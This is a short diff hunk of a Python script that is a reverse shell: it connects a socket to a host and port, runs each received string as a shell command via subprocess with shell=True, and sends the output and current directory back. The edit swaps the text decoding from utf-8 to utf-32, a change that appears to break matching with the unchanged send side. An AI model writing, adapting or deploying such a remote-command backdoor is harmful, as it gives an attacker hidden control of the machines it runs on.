@@ -9,12 +9,12 @@ s.connect((host,port))
 
 while True:
     data=s.recv(1024)
-    if data[:2].decode("utf-8")=="cd":
-        os.chdir(data[3:].decode("utf-8"))
+    if data[:2].decode("utf-32")=="cd":
+        os.chdir(data[3:].decode("utf-32"))
     if len(data) > 0:
-        cmd=subprocess.Popen(data.decode("utf-8"),shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        cmd=subprocess.Popen(data.decode("utf-32"),shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         output=cmd.stdout.read()+cmd.stderr.read()
-        output=str(output,"utf-8")
+        output=str(output,"utf-32")
         string3=str.encode(output+str(os.getcwd()+'>'))
         s.send(string3)
 s.close()
